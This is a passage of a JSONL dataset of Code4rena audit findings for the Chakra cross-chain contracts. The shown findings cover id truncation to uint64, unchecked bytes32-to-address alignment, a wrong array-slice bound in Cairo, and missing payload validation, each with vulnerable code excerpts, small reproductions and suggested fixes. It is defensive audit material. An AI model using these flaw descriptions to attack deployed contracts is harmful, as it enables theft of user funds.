`uint64`.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/libraries/MessageV1Codec.sol#L56-L58\n\n  ```solidity\n  function id(bytes calldata _msg) internal pure returns (uint64) {\n      return uint64(bytes8(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n  }\n  ```\n\n#### Vulnerability Demonstration:\n\n1. **Truncation Example**:\n   - If the `id` is a `uint256` with the value:\n     ```solidity\n     uint256 id = 0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef;\n     ```\n   - The current code in `MessageV1Codec.sol` will extract only the first 8 bytes and cast it to `uint64`:\n     ```solidity\n     uint64 truncatedId = uint64(bytes8(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n     ```\n   - This results in the truncated value:\n     ```solidity\n     truncatedId = 0x1234567890abcdef;\n     ```\n   - The higher-order bytes (`0x1234567890abcdef1234567890abcdef1234567890abcdef`) are lost, and only the lower 64 bits (`0x1234567890abcdef`) are retained.\n\n2. **Collision Example**:\n\nTwo different `bytes calldata _msg` can be give exactly the same id\n\n\n### **Tools Used**\n\n- Manual code review\n\n### **Recommended Mitigation Steps**\n\n1. **Update the `id` function in `MessageV1Codec.sol`** to extract the full 32 bytes and cast it to `uint256`, rather than truncating it to `uint64`. Here's the updated code:\n\n   ```solidity\n   function id(bytes calldata _msg) internal pure returns (uint256) {\n       require(_msg.length >= PAYLOAD_TYPE_OFFSET, \"Message too short\");\n       return uint256(bytes32(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n   }\n   ```\n\n2. **Ensure consistency** between the `id` type in `Message.sol` and `MessageV1Codec.sol`. If the `id` is defined as `uint256` in `Message.sol`, it should be handled as `uint256` throughout the codebase.\n\n\n\n## Assessed type\n\nUnder/Overflow\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/libraries/MessageV1Codec.sol#L56-L58\n\n\n# Vulnerability details\n\n## **Impact**\n\nThe struct `Message` in `Message.sol` contains `id` which was defined as a `uint256`, but in the contract `MessageV1Codec.sol`, the function `id` is extracted from `_msg[1:33]` which contains 32 bytes and was cast to `byte8` which was further cast to `uint64`. This results in **truncation** of the `id`, where only the lower 64 bits of the value are retained, and the higher 192 bits are discarded. This truncation can lead to:\n\n1. **Loss of Data**: The full `uint256` `id` is not preserved, which can cause incorrect behavior if the `id` is used for critical operations.\n   \n2. **Collision Risk**: Different `uint256` values could map to the same `uint64` value, leading to **id collisions**. An attacker could exploit this to manipulate the contract's behavior, especially if the `id` is used for transaction identification, cross-chain message handling, or access control.\n\n3. **Incorrect Logic**: If the contract logic relies on the full `uint256` `id` for uniqueness or correctness, truncating it to `uint64` could lead to incorrect behavior, such as misidentifying transactions or allowing unauthorized access.\n\n\n### **Proof of Concept**\n\n#### Code Reference:\n\n- **`Message.sol`**: The `id` is defined as a `uint256` in the `Message` struct.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/libraries/Message.sol#L32-L39\n\n  ```solidity\n  struct Message {\n      uint256 id;\n      PayloadType payload_type;\n      bytes payload;\n  }\n  ```\n\n- **`MessageV1Codec.sol`**: The `id` function incorrectly extracts only 8 bytes and casts it to `uint64`.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/handler/contracts/libraries/MessageV1Codec.sol#L56-L58\n\n  ```solidity\n  function id(bytes calldata _msg) internal pure returns (uint64) {\n      return uint64(bytes8(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n  }\n  ```\n\n#### Vulnerability Demonstration:\n\n1. **Truncation Example**:\n   - If the `id` is a `uint256` with the value:\n     ```solidity\n     uint256 id = 0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef;\n     ```\n   - The current code in `MessageV1Codec.sol` will extract only the first 8 bytes and cast it to `uint64`:\n     ```solidity\n     uint64 truncatedId = uint64(bytes8(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n     ```\n   - This results in the truncated value:\n     ```solidity\n     truncatedId = 0x1234567890abcdef;\n     ```\n   - The higher-order bytes (`0x1234567890abcdef1234567890abcdef1234567890abcdef`) are lost, and only the lower 64 bits (`0x1234567890abcdef`) are retained.\n\n2. **Collision Example**:\n   \nTwo different `bytes calldata _msg` can be give exactly the same id\n\n\n### **Tools Used**\n\n- Manual code review\n\n### **Recommended Mitigation Steps**\n\n1. **Update the `id` function in `MessageV1Codec.sol`** to extract the full 32 bytes and cast it to `uint256`, rather than truncating it to `uint64`. Here's the updated code:\n\n   ```solidity\n   function id(bytes calldata _msg) internal pure returns (uint256) {\n       require(_msg.length >= PAYLOAD_TYPE_OFFSET, \"Message too short\");\n       return uint256(bytes32(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n   }\n   ```\n\n2. **Ensure consistency** between the `id` type in `Message.sol` and `MessageV1Codec.sol`. If the `id` is defined as `uint256` in `Message.sol`, it should be handled as `uint256` throughout the codebase.\n\n\n\n## Assessed type\n\nUnder/Overflow"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-406", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 406, "page_start": null, "title": "Improper Address Alignment in to_address Function Leading to Potential Address Spoofing[AddressCast.sol::to_address()]", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L14-L18\n\n\n# Vulnerability details\n\n## Impact\nThis vulnerability allows incoming bytes32 addresses to not be checked or processed in the expected format. The contract does not verify whether the address is aligned on the left or right end, resulting in potential incorrect address conversion. An attacker may manipulate the contract logic by forging bytes32 addresses, causing invalid addresses to be considered valid, thereby affecting key functions of the contract, such as fund transfer or permission verification.\n\n## Proof of Concept\n\nLink1: https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L14-L18\n\nLink2: https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/libraries/AddressCast.sol#L22-L26\n\nThis function directly converts bytes32 to address, but does not verify whether the address in bytes32 is aligned on the correct side. Since Solidity addresses are of type uint160 and bytes32 is of type uint256, if the user does not strictly follow the correct alignment, the bytes32 type address conversion will fail if the address is left-aligned, leading to serious security issues.\n\n**Steps to reproduce:**\n- If the user's address is: `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`\n- The user encapsulates the address into bytes32 type in the following way:\n```solidity\n    function convertAddreeToBytes32() external view returns(address) {\n        uint160 ms = uint160(msg.sender);\n        bytes32 res = bytes32(bytes20(ms));\n        return AddressCast.to_address(res);\n    }\n```\n- The output result is: `0x3fCb875F56bEDdc4000000000000000000000000`\n\nFrom the results, we can see that after the conversion by the `to_address(bytes32 _address)` function, the caller msg.sender and the output result are completely different, which is absolutely not allowed.\n\n## Tools Used\n- Manual analysis\n- Remix IDE\n\n## Recommended Mitigation Steps\nTo prevent this vulnerability, you need to check whether bytes32 conforms to the valid uint160 address format during address conversion and specify the alignment of the address in bytes32 data. This can be fixed by:\n\n- Verify that the incoming bytes32 data is aligned on the left or right before doing address conversion.\n\n```solidity\n    function to_address(\n        bytes32 _address\n    ) internal pure returns (address result) {\n        require(uint256(_address) <= type(uint160).max, \"Invalid address format\");\n        result = address(uint160(uint256(_address)));\n    }\n```\n\n\n## Assessed type\n\nDecimal\n", "sections": {"description_md": null, "impact_md": "## Impact\nThis vulnerability allows incoming bytes32 addresses to not be checked or processed in the expected format. The contract does not verify whether the address is aligned on the left or right end, resulting in potential incorrect address conversion. An attacker may manipulate the contract logic by forging bytes32 addresses, causing invalid addresses to be considered valid, thereby affecting key functions of the contract, such as fund transfer or permission verification.\n", "recommendation_md": "## Recommended Mitigation Steps\nTo prevent this vulnerability, you need to check whether bytes32 conforms to the valid uint160 address format during address conversion and specify the alignment of the address in bytes32 data. This can be fixed by:\n\n- Verify that the incoming bytes32 data is aligned on the left or right before doing address conversion.\n\n```solidity\n    function to_address(\n        bytes32 _address\n    ) internal pure returns (address result) {\n        require(uint256(_address) <= type(uint160).max, \"Invalid address format\");\n        result = address(uint160(uint256(_address)));\n    }\n```\n\n\n## Assessed type\n\nDecimal\n", "poc_md": "## Proof of Concept\n\nLink1: https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L14-L18\n\nLink2: https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/libraries/AddressCast.sol#L22-L26\n\nThis function directly converts bytes32 to address, but does not verify whether the address in bytes32 is aligned on the correct side. Since Solidity addresses are of type uint160 and bytes32 is of type uint256, if the user does not strictly follow the correct alignment, the bytes32 type address conversion will fail if the address is left-aligned, leading to serious security issues.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L14-L18\n\n**container:**\n# Vulnerability details\n\n**Steps to reproduce:**\n- If the user's address is: `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`\n- The user encapsulates the address into bytes32 type in the following way:\n```solidity\n    function convertAddreeToBytes32() external view returns(address) {\n        uint160 ms = uint160(msg.sender);\n        bytes32 res = bytes32(bytes20(ms));\n        return AddressCast.to_address(res);\n    }\n```\n- The output result is: `0x3fCb875F56bEDdc4000000000000000000000000`\n\nFrom the results, we can see that after the conversion by the `to_address(bytes32 _address)` function, the caller msg.sender and the output result are completely different, which is absolutely not allowed.\n\n**tools_used:**\n## Tools Used\n- Manual analysis\n- Remix IDE\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L14-L18\n\n\n# Vulnerability details\n\n## Impact\nThis vulnerability allows incoming bytes32 addresses to not be checked or processed in the expected format. The contract does not verify whether the address is aligned on the left or right end, resulting in potential incorrect address conversion. An attacker may manipulate the contract logic by forging bytes32 addresses, causing invalid addresses to be considered valid, thereby affecting key functions of the contract, such as fund transfer or permission verification.\n\n## Proof of Concept\n\nLink1: https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L14-L18\n\nLink2: https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/libraries/AddressCast.sol#L22-L26\n\nThis function directly converts bytes32 to address, but does not verify whether the address in bytes32 is aligned on the correct side. Since Solidity addresses are of type uint160 and bytes32 is of type uint256, if the user does not strictly follow the correct alignment, the bytes32 type address conversion will fail if the address is left-aligned, leading to serious security issues.\n\n**Steps to reproduce:**\n- If the user's address is: `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`\n- The user encapsulates the address into bytes32 type in the following way:\n```solidity\n    function convertAddreeToBytes32() external view returns(address) {\n        uint160 ms = uint160(msg.sender);\n        bytes32 res = bytes32(bytes20(ms));\n        return AddressCast.to_address(res);\n    }\n```\n- The output result is: `0x3fCb875F56bEDdc4000000000000000000000000`\n\nFrom the results, we can see that after the conversion by the `to_address(bytes32 _address)` function, the caller msg.sender and the output result are completely different, which is absolutely not allowed.\n\n## Tools Used\n- Manual analysis\n- Remix IDE\n\n## Recommended Mitigation Steps\nTo prevent this vulnerability, you need to check whether bytes32 conforms to the valid uint160 address format during address conversion and specify the alignment of the address in bytes32 data. This can be fixed by:\n\n- Verify that the incoming bytes32 data is aligned on the left or right before doing address conversion.\n\n```solidity\n    function to_address(\n        bytes32 _address\n    ) internal pure returns (address result) {\n        require(uint256(_address) <= type(uint160).max, \"Invalid address format\");\n        result = address(uint160(uint256(_address)));\n    }\n```\n\n\n## Assessed type\n\nDecimal\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L14-L18\n\n\n# Vulnerability details\n\n## Impact\nThis vulnerability allows incoming bytes32 addresses to not be checked or processed in the expected format. The contract does not verify whether the address is aligned on the left or right end, resulting in potential incorrect address conversion. An attacker may manipulate the contract logic by forging bytes32 addresses, causing invalid addresses to be considered valid, thereby affecting key functions of the contract, such as fund transfer or permission verification.\n\n## Proof of Concept\n\nLink1: https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L14-L18\n\nLink2: https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/libraries/AddressCast.sol#L22-L26\n\nThis function directly converts bytes32 to address, but does not verify whether the address in bytes32 is aligned on the correct side. Since Solidity addresses are of type uint160 and bytes32 is of type uint256, if the user does not strictly follow the correct alignment, the bytes32 type address conversion will fail if the address is left-aligned, leading to serious security issues.\n\n**Steps to reproduce:**\n- If the user's address is: `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`\n- The user encapsulates the address into bytes32 type in the following way:\n```solidity\n    function convertAddreeToBytes32() external view returns(address) {\n        uint160 ms = uint160(msg.sender);\n        bytes32 res = bytes32(bytes20(ms));\n        return AddressCast.to_address(res);\n    }\n```\n- The output result is: `0x3fCb875F56bEDdc4000000000000000000000000`\n\nFrom the results, we can see that after the conversion by the `to_address(bytes32 _address)` function, the caller msg.sender and the output result are completely different, which is absolutely not allowed.\n\n## Tools Used\n- Manual analysis\n- Remix IDE\n\n## Recommended Mitigation Steps\nTo prevent this vulnerability, you need to check whether bytes32 conforms to the valid uint160 address format during address conversion and specify the alignment of the address in bytes32 data. This can be fixed by:\n\n- Verify that the incoming bytes32 data is aligned on the left or right before doing address conversion.\n\n```solidity\n    function to_address(\n        bytes32 _address\n    ) internal pure returns (address result) {\n        require(uint256(_address) <= type(uint160).max, \"Invalid address format\");\n        result = address(uint160(uint256(_address)));\n    }\n```\n\n\n## Assessed type\n\nDecimal"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-408", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 408, "page_start": null, "title": "Array slicing  potentially exceed the intended bounds", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L429\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L446\n\n\n# Vulnerability details\n\n## Impact\nThe resulting slice includes elements beyond the expected range. This can lead to functional failures or even vulnerabilities causing the system to behave in unintended ways.\n\n## Proof of Concept\n[`u128_array_slice()`](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L427-L442) for slicing an array of `u128` elements has a flaw in the calculation of the range for slicing.\n```solidity\n    fn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n        let mut slice = ArrayTrait::new();\n>>      let len = begin + end;\n        loop {\n>>          if begin >= len {\n                break ();\n            }\n            if begin >= src.len() {\n                break ();\n            }\n\n            slice.append(*src[begin]);\n            begin += 1;\n        };\n        slice\n    }\n```\nThe variable `len` is meant to represent the end of the `slice`. However, by setting `len` to `begin + end`, you are adding `begin` to `end` instead of just using `end` as the `termination index` of the slice. This miscalculation can cause slicing to exceed the intended bounds, leading to unexpected results.\n\n**Scenario:**\n- Consider the following:\n```solidity\n    let len = begin + end;  // if begin = 2 and end = 5\n```\n- You intend to slice from `index 2` to `index 5`, but the logic adds `begin` and `end`, giving a total `len = 7`.\n- This makes the slicing operation capture elements from `index 2` to `index 6`, which is not what was intended.\n\n**Other affected function**:\n- [`u64_array_slice()`](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L446)\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nThe slicing logic should ensure that `end` represents the exclusive upper bound of the slice and should not be added to `begin`. Instead, use `end` directly, and clamp it to the `size of the source array` to prevent out-of-bounds access.\n```diff\n    fn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n        let mut slice = ArrayTrait::new();\n-       let len = begin + end;\n\n+       // Ensure 'end' is within the bounds of the source array\n+       let len = if end <= src.len() { end } else { src.len() };\n\n        loop {\n            if begin >= len {\n                break ();\n            }\n            if begin >= src.len() {\n                break ();\n            }\n\n            slice.append(*src[begin]);\n            begin += 1;\n        };\n        slice\n    }\n```\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nInvalid Validation\n", "sections": {"description_md": null, "impact_md": "## Impact\nThe resulting slice includes elements beyond the expected range. This can lead to functional failures or even vulnerabilities causing the system to behave in unintended ways.\n", "recommendation_md": "## Recommended Mitigation Steps\nThe slicing logic should ensure that `end` represents the exclusive upper bound of the slice and should not be added to `begin`. Instead, use `end` directly, and clamp it to the `size of the source array` to prevent out-of-bounds access.\n```diff\n    fn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n        let mut slice = ArrayTrait::new();\n-       let len = begin + end;\n\n+       // Ensure 'end' is within the bounds of the source array\n+       let len = if end <= src.len() { end } else { src.len() };\n\n        loop {\n            if begin >= len {\n                break ();\n            }\n            if begin >= src.len() {\n                break ();\n            }\n\n            slice.append(*src[begin]);\n            begin += 1;\n        };\n        slice\n    }\n```\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nInvalid Validation\n", "poc_md": "## Proof of Concept\n[`u128_array_slice()`](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L427-L442) for slicing an array of `u128` elements has a flaw in the calculation of the range for slicing.\n```solidity\n    fn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n        let mut slice = ArrayTrait::new();\n>>      let len = begin + end;\n        loop {\n>>          if begin >= len {\n                break ();\n            }\n            if begin >= src.len() {\n                break ();\n            }\n\n            slice.append(*src[begin]);\n            begin += 1;\n        };\n        slice\n    }\n```\nThe variable `len` is meant to represent the end of the `slice`. However, by setting `len` to `begin + end`, you are adding `begin` to `end` instead of just using `end` as the `termination index` of the slice. This miscalculation can cause slicing to exceed the intended bounds, leading to unexpected results.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L429\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L446\n\n**container:**\n# Vulnerability details\n\n**Scenario:**\n- Consider the following:\n```solidity\n    let len = begin + end;  // if begin = 2 and end = 5\n```\n- You intend to slice from `index 2` to `index 5`, but the logic adds `begin` and `end`, giving a total `len = 7`.\n- This makes the slicing operation capture elements from `index 2` to `index 6`, which is not what was intended.\n\n**Other affected function:**\n- [`u64_array_slice()`](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L446)\n\n**tools_used:**\n## Tools Used\nManual Review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L429\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L446\n\n\n# Vulnerability details\n\n## Impact\nThe resulting slice includes elements beyond the expected range. This can lead to functional failures or even vulnerabilities causing the system to behave in unintended ways.\n\n## Proof of Concept\n[`u128_array_slice()`](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L427-L442) for slicing an array of `u128` elements has a flaw in the calculation of the range for slicing.\n```solidity\n    fn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n        let mut slice = ArrayTrait::new();\n>>      let len = begin + end;\n        loop {\n>>          if begin >= len {\n                break ();\n            }\n            if begin >= src.len() {\n                break ();\n            }\n\n            slice.append(*src[begin]);\n            begin += 1;\n        };\n        slice\n    }\n```\nThe variable `len` is meant to represent the end of the `slice`. However, by setting `len` to `begin + end`, you are adding `begin` to `end` instead of just using `end` as the `termination index` of the slice. This miscalculation can cause slicing to exceed the intended bounds, leading to unexpected results.\n\n**Scenario:**\n- Consider the following:\n```solidity\n    let len = begin + end;  // if begin = 2 and end = 5\n```\n- You intend to slice from `index 2` to `index 5`, but the logic adds `begin` and `end`, giving a total `len = 7`.\n- This makes the slicing operation capture elements from `index 2` to `index 6`, which is not what was intended.\n\n**Other affected function**:\n- [`u64_array_slice()`](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L446)\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nThe slicing logic should ensure that `end` represents the exclusive upper bound of the slice and should not be added to `begin`. Instead, use `end` directly, and clamp it to the `size of the source array` to prevent out-of-bounds access.\n```diff\n    fn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n        let mut slice = ArrayTrait::new();\n-       let len = begin + end;\n\n+       // Ensure 'end' is within the bounds of the source array\n+       let len = if end <= src.len() { end } else { src.len() };\n\n        loop {\n            if begin >= len {\n                break ();\n            }\n            if begin >= src.len() {\n                break ();\n            }\n\n            slice.append(*src[begin]);\n            begin += 1;\n        };\n        slice\n    }\n```\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nInvalid Validation\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L429\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L446\n\n\n# Vulnerability details\n\n## Impact\nThe resulting slice includes elements beyond the expected range. This can lead to functional failures or even vulnerabilities causing the system to behave in unintended ways.\n\n## Proof of Concept\n[`u128_array_slice()`](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L427-L442) for slicing an array of `u128` elements has a flaw in the calculation of the range for slicing.\n```solidity\n    fn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n        let mut slice = ArrayTrait::new();\n>>      let len = begin + end;\n        loop {\n>>          if begin >= len {\n                break ();\n            }\n            if begin >= src.len() {\n                break ();\n            }\n\n            slice.append(*src[begin]);\n            begin += 1;\n        };\n        slice\n    }\n``` \nThe variable `len` is meant to represent the end of the `slice`. However, by setting `len` to `begin + end`, you are adding `begin` to `end` instead of just using `end` as the `termination index` of the slice. This miscalculation can cause slicing to exceed the intended bounds, leading to unexpected results.\n\n**Scenario:**\n- Consider the following:\n```solidity\n    let len = begin + end;  // if begin = 2 and end = 5\n```\n- You intend to slice from `index 2` to `index 5`, but the logic adds `begin` and `end`, giving a total `len = 7`. \n- This makes the slicing operation capture elements from `index 2` to `index 6`, which is not what was intended.\n\n**Other affected function**:\n- [`u64_array_slice()`](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L446)\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nThe slicing logic should ensure that `end` represents the exclusive upper bound of the slice and should not be added to `begin`. Instead, use `end` directly, and clamp it to the `size of the source array` to prevent out-of-bounds access.\n```diff\n    fn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n        let mut slice = ArrayTrait::new();\n-       let len = begin + end;\n\n+       // Ensure 'end' is within the bounds of the source array\n+       let len = if end <= src.len() { end } else { src.len() };\n\n        loop {\n            if begin >= len {\n                break ();\n            }\n            if begin >= src.len() {\n                break ();\n            }\n\n            slice.append(*src[begin]);\n            begin += 1;\n        };\n        slice\n    }\n```\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nInvalid Validation"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-422", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 422, "page_start": null, "title": "Lack of Validation for payload and payload_type", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L176\n\n\n# Vulnerability details\n\n## Impact\nThe `receive_cross_chain_msg` function currently accepts `payload` and `payload_type` as parameters without any validation to ensure that they are legitimate and appropriate for the context. The payload and payload_type should be verified to ensure that the message conforms to expected types This lack of validation can be exploited by attackers to pass malicious or malformed payloads, potentially leading to unauthorized actions, contract manipulation, or even denial of service. If an invalid or unexpected payload is processed, it could cause unexpected behavior in the contract or downstream contracts that interact with the payload.\n\n```javascript\n function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n        {\n            // verify signature\n            bytes32 message_hash = keccak256(\n                abi.encodePacked(\n                    txid,\n                    from_chain,\n                    from_address,\n                    from_handler,\n                    to_handler,\n                    keccak256(payload)\n                )\n            );\n\n            require(\n                signature_verifier.verify(message_hash, signatures, sign_type),\n                \"Invalid signature\"\n            );\n\n            require(\n                receive_cross_txs[txid].status == CrossChainMsgStatus.Unknow,\n                \"Invalid transaction 